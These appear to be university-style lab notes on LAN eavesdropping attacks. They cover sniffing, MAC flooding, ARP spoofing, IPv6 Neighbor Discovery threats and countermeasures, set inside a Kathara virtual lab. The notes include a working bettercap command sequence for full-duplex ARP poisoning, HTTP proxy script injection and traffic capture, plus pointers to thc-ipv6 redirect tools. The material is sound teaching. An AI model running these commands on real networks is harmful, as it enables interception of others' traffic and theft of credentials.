# Network Eavesdropping/Sniffing 

> GOAL : *capture packets transmitted by other's nodes through the network and analyze it in search of sensitive information*([Sniffing](https://www.tutorialspoint.com/ethical_hacking/ethical_hacking_sniffing.htm)) 
> - *Passive Attack* type
> - all clear data *exchanged by unsafe protocols* : **without encryption**
>   - *HTTP, SMTP, POP, FTP, IMAP, DNS...*

> Tools $\rightarrowtail$ [Network Sniffers](https://www.tutorialspoint.com/ethical_hacking/ethical_hacking_sniffing_tools.htm) + protocol decoders or stream reassembling

## What does it require?

- NIC in **[Promiscuous mode](/Labs/%5B1%5DNetworking%20101%2Bscript.md#Network%20Traffic%20Monitoring)** : pass all the observable traffic without discrimination to the CPU
- Sniffer placed *along the path* or on the **same Broadcast domain**
  - in Non-switched LANs
    - networks with HUBs
  - in Switched LANs
    - by flooding with large amount frames that **breaks switch segmentation** ([MAC flooding Attack](https://en.wikipedia.org/wiki/MAC_flooding))
    - by **redirect the traffic** from one port to another ([ARP spoofing Attack](https://en.wikipedia.org/wiki/ARP_spoofing) - MITM Attack)
  - in Wireless LANs 
    - if **no or weak encryption is used** : [WEP/WPA1,2](https://inis.iaea.org/collection/NCLCollectionStore/_Public/46/130/46130069.pdf)

## How Break Switch segmentation mechanism?

### Bridges & Switches 

> reference: **[bridged NICs](https://wiki.debian.org/BridgeNetworkConnections)|[veth(4)](https://man7.org/linux/man-pages/man4/veth.4.html)|[bridging commands](https://developers.redhat.com/articles/2022/04/06/introduction-linux-bridging-commands-and-features#)**

> What they are?
> - Simple **[Network Bridge](https://en.wikipedia.org/wiki/Network_bridge)** : Lv2-device connecting 2 network segments 
>   
>   - Ethernet or lv2-related segments
>   - separate collision domains + same Lv3 Network
>   - **Forwarding** techniques : store and forward, Cut through, ...   
>   - Regenerate segments **only towards destination** segment
>   - Broadcast frame : flood the frame to all ports of the bridge *except the one from which it was received*
> 
> - Transparent Bridging : when the frame format and its addressing **aren't changed substantially**
>   - when connects 2 networks with *the same Lv2 Network Protocol*
>
> - Multiport Bridging : connects multiple segments and decide frame-by-frame whether **to forward traffic**
>   - base for Network Switches 
> 
> **forwarding is not routing!!**

### CAM table & Overflow 

|device|table | what maps? |
|--| --|-- |
|hosts|**[Address Resolution Protocol(ARP)](https://en.wikipedia.org/wiki/Address_Resolution_Protocol)** |MAC addr <-> IP addr|
|Switches|**[Content Addressable Memory(CAM)](https://www.greycampus.com/opencampus/ethical-hacking/arp-and-cam-cable)** | MAC addr <-> Switch Port <-> VLAN params|
|Bridges|**[Forwarding Information Base(FIB)](https://en.wikipedia.org/wiki/Forwarding_information_base)**|MAC addr <-> Bridge port|

> [Unicast flood](https://en.wikipedia.org/wiki/Unicast_flood) : Learning process of bridges (first step of MAC Flooding attack)
- CAM/FIB table **has fixed size**
- If a MAC addr is unknown the bridge **will consider the frame as broadcast**, flooding the frame to all segments *except the one from which it was received*

### MAC flooding

> "***A switch** that has **no room left in its address cache will flood** the frame out to all ports. This is a common problem on networks with many hosts. Less common is the artificial flooding of address tables—this is termed **MAC flooding***"

Attack is based on type of Learning process + CAM table's limited size (Theoretical attack until May 1999)

Possible fix? --> **make it efficient** : use **hash fx** to place MAC inside CAM table and retrieve entry
- **still cannot prevent flooding** when all buckets are full
  - Switch start flooding (attack success)
  - Switch freezes/crash (DOS success)

Today prevention --> **port security**
  - *Limit amount of* MAC addresses per port
  - maintain small *secure MACs* 
  - detect anomalies and block offending MAC or *shut down the port*

# ARP Spoofing/Poisoning

> GOAL : *to associate the attacker's MAC address with the IP address of another host (default gateway, DNS, hosts...) causing any traffic meant for that IP address to be sent to the attacker instead*([ARP Poisoning](https://www.tutorialspoint.com/ethical_hacking/ethical_hacking_arp_poisoning.htm))
> - *Passive/Active attack* type
>   - *pretend to be anybody*
>   - [ARP spoofing](https://www.veracode.com/security/arp-spoofing) is used **as opening for other attacks** 
>   - DOS / MITM / Session hijacking  
> - ARP has **no authentication mechanism of source host**
>   - this is a Vulnerability of the protocol
>   - attacker can send (spoofed/forged) ARP messages and redirect traffic

[Gratuitous ARP response](https://www.practicalnetworking.net/series/arp/gratuitous-arp/) : *broadcast packet* used by hosts to “announce” their IP address to the local network *without any ARP request*

Attacker can flood network with Gratuitous ARP responses and hosts will link IP of default GW with MAC address of Attacker redirecting all traffic to the attacker machine

# IPv6 Neighbor Discovery threats

 > [Neighbor discovery](https://www.computernetworkingnotes.com/networking-tutorials/ipv6-neighbor-discovery-protocol-explained.html) is set of processes and messages that replace ARP, ICMP Router discovery and ICMP Redirect mss used in IPv4 : Neigh Solic/Adv + Duplicate Address Detection(DAD) + ICMPv6 redirect
 > - **Neigh Discovery Prt: [RFC 4861](https://datatracker.ietf.org/doc/html/rfc4861)**
 > - **NDP known threats : [RFC 3756](https://datatracker.ietf.org/doc/html/rfc3756)** 
 > - [THC-IPV6-ATTACK-TOOLKIT](https://github.com/vanhauser-thc/thc-ipv6)
 > - [SI6 Networks IPv6 Toolkit](https://github.com/fgont/ipv6toolkit)

#### DAD Dos
> Always answering to any Neigh Solicitation in DAD protocol
#### Rouge RA
> when receive RA You take it for good and then *when using VPN* attacker force you to **bypass VPN** (tunnel split) 
#### RA flooding 
> generate lots of (RA) (heavy to compute)
#### DHCP rouge server/DHCP starvation
> Dos a network by requestiong all the available DHCP addresses and then **provide addr** to hosts and **impersonate** DHCP, DNS server and default GW

#### ICMP redirect Attack
> When multiple routers are on the same local link: one can send an ICMPv6 redirect and inform hosts to forward messages to the other router closes to the destination; this can be exploit to perform a MITM attack

# Lab3 Activity

### EX1

> GOAL : Join the network and eavesdrop the traffic in kathara

We want to use **linux bridging** and connect host machine to virtual bridge of kathara machines:

> connection script: [conn_to_lab.sh](/labs/%5B1%5DNetworking%20101%2Bscript.md#Host%20Connection%20Script)
```bash
# add (or del) a virtual interface (pair veth0@veth1)
$ ip link add dev veth0 type veth peer name veth1
# connect one veth end to the virtual bridge
# br0 from -->  brctl show | grep kt-
$ ip link set master br0 dev veth1
# assign an IP address to the other end (not enslaved):
$ ip addr add x.x.x.x/y dev veth0
# enable both the ends of the virtual interface
$ ip link set veth0 up  
$ ip link set veth1 up  
```

### EX2

> GOAL : install **[bettercap](https://www.cyberpunk.rs/install-mitm-attack-framework-bettercap)** and perform a MITM attack through **ARP poisoning** 
> - [Man-ITM Attack Guide](https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy) | [arp.spoof module](https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/)
> - Victim machine can be host machine after connection to kathara virtual network
```bash
# unzip bettercap
./bettercap
help [module_name] # module info 
net.probe on # network discovery 
net.show # show network information
set gateway.address 192.168.100.1 
# arp poisoning options
set arp.spoof.internal true
set arp.spoof.fullduplex true
set arp.spoof.redirect false
set arp.spoof.targets [all inside network, host included]
arp.spoof on
# http script 
set http.proxy.script http-proxy-pwned.js
http.proxy on

# enable sniffer and save it
set net.sniff.verbose true
set net.sniff.output /shared/sniff_bettercap.pcap
net.sniff on
```
### EX3/4/5
> GOAL: compile tool inside 'thc-ipv6-3.6' folder and use its modules

> GOAL: redirect ICMP traffic, impersonate r1, flow packets on LANx and capture using wireshark
> - [redir6 tool](https://www.mankier.com/8/redir6) from thc-ipv6


# Reject redirects!!

- /proc/sys/net/ipv4/conf/all/accept_redirects
  - TRUE (host) //  FALSE (router)
  - Functional default: enabled if local forwarding is disabled
  - disabled if local forwarding is enabled
- /proc/sys/net/ipv4/conf/all/secure_redirects
  - TRUE
- /proc/sys/net/ipv4/conf/all/shared_media
  - TRUE
- /proc/sys/net/ipv6/conf/all/accept_redirects 
  
> accept_redirects and alike --> FALSE

***reject redirect + unreachable packets !!!!!***


